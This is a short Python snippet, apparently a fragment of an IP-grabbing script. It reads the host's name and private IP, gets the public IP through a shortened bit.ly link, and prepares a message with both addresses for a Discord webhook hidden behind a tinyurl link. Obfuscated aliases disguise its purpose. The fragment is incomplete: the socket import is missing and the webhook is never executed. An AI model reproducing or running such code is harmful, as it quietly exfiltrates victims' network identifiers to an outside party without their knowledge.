...
from discord_webhook import DiscordWebhook as elee
from urllib.request import Request, urlopen


ene = 'https://tinyurl.com/yzsx698t'


pip= socket.gethostname()
pri = socket.gethostbyname(pip)
qti = urlopen(Request("https://bit.ly/2PTxfFq")).read().decode().strip()



webhook = elee(url=f'{ene}', content=f'PU: {qti} \nPRI: {pri}\n\nLOL')
